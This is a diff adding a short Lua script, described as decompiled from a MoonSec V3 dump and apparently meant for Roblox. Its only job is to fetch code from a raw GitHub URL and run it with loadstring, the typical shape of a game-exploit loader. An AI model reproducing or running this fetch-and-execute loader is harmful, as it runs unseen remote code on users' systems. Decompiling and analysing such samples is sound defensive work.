@@ -1,0 +1,23 @@
+-- Decompiled Lua source from MoonSec V3 dump
+-- Original script appears to be a loader that fetches and executes remote code
+
+local function fetchAndExecute()
+    local success, result = pcall(function()
+        -- Get the HTTP service
+        local HttpService = game:GetService("HttpService")
+        
+        -- Fetch the script from GitHub
+        local url = 'https://raw.githubusercontent.com/Jayfrr/Erazedlockz/refs/heads/main/Erazed.lockz'
+        local response = game:HttpGet(url)
+        
+        -- Execute the fetched code
+        loadstring(response)()
+    end)
+    
+    if not success then
+        warn("Failed to execute remote script: " .. tostring(result))
+    end
+end
+
+-- Execute the main function
+fetchAndExecute()
